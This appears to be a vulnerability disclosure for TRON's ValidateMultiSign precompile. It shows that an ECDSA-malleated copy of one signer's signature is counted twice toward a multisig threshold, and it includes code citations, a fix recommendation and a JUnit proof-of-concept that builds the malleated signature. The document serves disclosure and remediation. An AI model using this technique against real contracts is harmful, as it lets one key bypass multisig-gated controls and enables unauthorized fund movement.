### Title
`ValidateMultiSign` precompile over-counts a single signer's weight via ECDSA signature malleability, bypassing multi-key permission thresholds - ([File: actuator/src/main/java/org/tron/core/vm/PrecompiledContracts.java])

### Summary
The `ValidateMultiSign.execute` loop de-duplicates only *exact* byte-identical signatures per recovered address; when a second, byte-distinct but still valid signature recovers to an address already counted, the code performs a CPU-time guard check but then falls through and adds that signer's weight to `totalWeight` **again**. Because `ECKey.validateComponents` does not enforce canonical low-`s` (no `s <= HALF_CURVE_ORDER` check), an attacker can trivially derive a second valid signature `(r, n-s, v')` from one already-known signature of a single private key, letting one real key satisfy a multi-signer weight threshold alone.

### Finding Description
The vulnerable loop is in `PrecompiledContracts.ValidateMultiSign.execute`: [1](#0-0) 

For each signature in the attacker-supplied `bytes[]` array:
1. `recoveredAddr = recoverAddrBySign(sign, hash)` recovers the signer address.
2. `sign = merge(recoveredAddr, sign)` builds a combined key.
3. If `recoveredAddr` was already seen (`matrixContains(executedSignList, recoveredAddr)`):
   - if the *exact same* combined `sign` was already seen too → `continue` (correctly skips true duplicates, e.g. re-submitting the identical bytes).
   - otherwise it only calls `MUtil.checkCPUTime()` (a CPU-budget guard) and **does not `continue`** — execution falls through to the weight computation.
4. `weight = TransactionCapsule.getWeight(permission, recoveredAddr)` is added to `totalWeight` and both `sign` and `recoveredAddr` are appended to `executedSignList` regardless of the address having already contributed weight.

This means the *only* thing prevented is submitting the identical signature bytes twice; any second signature that recovers to the same address but differs at the byte level is fully re-counted.

`recoverAddrBySign` validates signature components via `SignUtils`/`ECKey.ECDSASignature.validateComponents`, which only checks `v ∈ {27,28}` and `1 <= r,s < SECP256K1N`: [2](#0-1) 

It does **not** require canonical low-`s` (`s <= HALF_CURVE_ORDER`), unlike `ECDSASignature.toCanonicalised()` which is only applied when the library itself signs via `ECKey.sign()`: [3](#0-2) 

Since the attacker crafts the raw ABI-encoded `bytes[]` directly (not via `ECKey.sign()`), they can take any one valid signature `(r, s, v)` for the target hash from a key they legitimately control, and compute the standard ECDSA-malleable counterpart `(r, n-s, v XOR 1)`. This second signature is byte-distinct, passes `validateComponents`, and `ECRecover`/`recoverAddrBySign` correctly recovers the **same** address from it (SEC1/BouncyCastle's `recoverPubBytesFromSignature` does not reject non-canonical `s`). The `matrixContains(executedSignList, sign)` exact-duplicate check therefore misses it, and the missing `continue` after `MUtil.checkCPUTime()` lets the same signer's weight be added a second (or up to `MAX_SIZE - 1` = 4 additional) time.

`TransactionCapsule.getWeight` simply looks up static per-address weight from the `Permission`, with no notion of "already used": [4](#0-3) 

Note this is unrelated to `ProgramTraceListener`/`CompositeProgramListener`: those only record stack/memory ops for tracing and do not participate in `ValidateMultiSign`'s weight accounting; `Program.callToPrecompiledAddress` invokes the precompile synchronously and single-threaded, so there is no genuine concurrency interaction with the trace bookkeeping — the root cause is purely the missing de-duplication-by-address logic inside `ValidateMultiSign.execute`.

### Impact Explanation
Any TVM contract or account can call `validatemultisign(address,uint256,bytes32,bytes[])` (the precompile at the TVM address dispatched via `PrecompiledContracts.getContractForAddress`) with a target account/permissionId that requires multiple distinct signer weights (e.g. threshold=2, two keys each weight 1). An attacker who controls only **one** of the two required keys can pass the check by submitting that key's signature twice in malleated form, causing `totalWeight` (1+1=2) to reach the threshold using a single real signer. Any DApp/contract-level logic (escrow release, DAO/multisig gated actions, smart-contract permission gating) that relies on `validatemultisign`/`batchvalidatesign`-style on-chain threshold checks can be bypassed, enabling unauthorized execution of permission-gated contract logic without collecting the required number of independent signers.

### Likelihood Explanation
- Precondition: target account has an `Active` permission with `threshold > 1` and at least one key with `weight < threshold` that the attacker controls (a common multisig setup).
- Feasibility: computing the ECDSA malleable counterpart `(r, n-s, v')` requires no private key access beyond already having one valid signature over the fixed hash — pure arithmetic (`s' = n - s`), fully within `MAX_SIZE = 5` signatures.
- Repeatable deterministically for any qualifying multisig account; no race condition, no special network state, no admin/governance access needed — purely an unprivileged attacker crafting `bytes[]` input to a public precompile.

### Recommendation
In `ValidateMultiSign.execute` (and the analogous logic in `BatchValidateSign` if applicable), deduplicate by **recovered address only**, not by the combined `(address, rawSignatureBytes)` pair: once `recoveredAddr` has contributed weight, any further signature recovering to the same address must be skipped (`continue`) regardless of byte-level differences. Additionally, enforce canonical signature encoding (`s <= HALF_CURVE_ORDER`) in `ECDSASignature.validateComponents`/`recoverAddrBySign` to reject malleated signatures outright, consistent with `toCanonicalised()`.

### Proof of Concept
```java
// framework/src/test/java/org/tron/common/runtime/vm/ValidateMultiSignContractTest.java

@Test
public void testMalleableSignatureDoubleCountsWeight() {
  // Account with Active permission: threshold=2, two keys each weight=1.
  ECKey key = new ECKey();
  AccountCapsule toAccount = new AccountCapsule(ByteString.copyFrom(key.getAddress()),
      Protocol.AccountType.Normal, System.currentTimeMillis(), true,
      dbManager.getDynamicPropertiesStore());

  ECKey key1 = new ECKey(); // attacker controls ONLY key1
  ECKey key2 = new ECKey(); // attacker does NOT control key2

  Protocol.Permission activePermission = Protocol.Permission.newBuilder()
      .setType(Protocol.Permission.PermissionType.Active)
      .setId(2).setPermissionName("active").setThreshold(2)
      .setOperations(ByteString.copyFrom(ByteArray.fromHexString(
          "0000000000000000000000000000000000000000000000000000000000000000")))
      .addKeys(Protocol.Key.newBuilder()
          .setAddress(ByteString.copyFrom(key1.getAddress())).setWeight(1).build())
      .addKeys(Protocol.Key.newBuilder()
          .setAddress(ByteString.copyFrom(key2.getAddress())).setWeight(1).build())
      .build();
  toAccount.updatePermissions(toAccount.getPermissionById(0), null,
      Collections.singletonList(activePermission));
  dbManager.getAccountStore().put(key.getAddress(), toAccount);

  byte[] data = Sha256Hash.hash(CommonParameter.getInstance().isECKeyCryptoEngine(), longData);
  byte[] merged = ByteUtil.merge(key.getAddress(), ByteArray.fromInt(2), data);
  byte[] toSign = Sha256Hash.hash(CommonParameter.getInstance().isECKeyCryptoEngine(), merged);

  // Legit signature from key1 only.
  ECKey.ECDSASignature sig = key1.sign(toSign);
  byte[] sig1 = sig.toBase64Signature(); // (r, s, v) - real bytes

  // Malleated counterpart from the SAME key1 signature: (r, n-s, v ^ 1).
  BigInteger n = ECKey.CURVE.getN();
  BigInteger sPrime = n.subtract(sig.s);
  byte vPrime = (byte) (sig.v == 27 ? 28 : 27);
  byte[] sig1Malleated = buildRawSignature(sig.r, sPrime, vPrime); // same layout as sig1

  List<Object> signs = new ArrayList<>();
  signs.add(Hex.toHexString(sig1));
  signs.add(Hex.toHexString(sig1Malleated)); // attacker never had key2

  // EXPECTED (correct behavior): should be ZERO (only 1 distinct real signer, weight 1 < threshold 2).
  // ACTUAL (bug): totalWeight = 1 + 1 = 2 >= threshold -> returns ONE, bypassing the 2-signer requirement.
  Assert.assertArrayEquals(
      validateMultiSign(StringUtil.encode58Check(key.getAddress()), 2, data, signs).getValue(),
      DataWord.ZERO().getData()); // <-- this assertion FAILS against current code, proving the bypass
}
```
Expected result on the current codebase: the assertion fails because `execute` returns `DataWord.ONE()`, proving that a single controlled key (weight 1) satisfies a threshold-2 permission by submitting a malleated duplicate of its own signature.

### Citations

**File:** actuator/src/main/java/org/tron/core/vm/PrecompiledContracts.java (L1086-1106)
```java
            long totalWeight = 0L;
            List<byte[]> executedSignList = new ArrayList<>();
            for (byte[] sign : signatures) {
              byte[] recoveredAddr = recoverAddrBySign(sign, hash);

              sign = merge(recoveredAddr, sign);
              if (ByteArray.matrixContains(executedSignList, recoveredAddr)) {
                if (ByteArray.matrixContains(executedSignList, sign)) {
                  continue;
                }
                MUtil.checkCPUTime();
              }
              long weight = TransactionCapsule.getWeight(permission, recoveredAddr);
              if (weight == 0) {
                //incorrect sign
                return Pair.of(true, DATA_FALSE);
              }
              totalWeight += weight;
              executedSignList.add(sign);
              executedSignList.add(recoveredAddr);
            }
```

**File:** crypto/src/main/java/org/tron/common/crypto/ECKey.java (L800-819)
```java
  public ECDSASignature sign(byte[] messageHash) {
    ECDSASignature sig = doSign(messageHash);
    // Now we have to work backwards to figure out the recId needed to
    // recover the signature.
    int recId = -1;
    byte[] thisKey = this.pub.getEncoded(/* compressed */ false);
    for (int i = 0; i < 4; i++) {
      byte[] k = ECKey.recoverPubBytesFromSignature(i, sig, messageHash);
      if (k != null && Arrays.equals(k, thisKey)) {
        recId = i;
        break;
      }
    }
    if (recId == -1) {
      throw new RuntimeException("Could not construct a recoverable key" +
          ". This should never happen.");
    }
    sig.v = (byte) (recId + 27);
    return sig;
  }
```

**File:** crypto/src/main/java/org/tron/common/crypto/ECKey.java (L923-941)
```java
    public static boolean validateComponents(BigInteger r, BigInteger s,
        byte v) {

      if (v != 27 && v != 28) {
        return false;
      }

      if (BIUtil.isLessThan(r, BigInteger.ONE)) {
        return false;
      }
      if (BIUtil.isLessThan(s, BigInteger.ONE)) {
        return false;
      }

      if (!BIUtil.isLessThan(r, SECP256K1N)) {
        return false;
      }
      return BIUtil.isLessThan(s, SECP256K1N);
    }
```

**File:** chainbase/src/main/java/org/tron/core/capsule/TransactionCapsule.java (L218-226)
```java
  public static long getWeight(Permission permission, byte[] address) {
    List<Key> list = permission.getKeysList();
    for (Key key : list) {
      if (key.getAddress().equals(ByteString.copyFrom(address))) {
        return key.getWeight();
      }
    }
    return 0;
  }
```
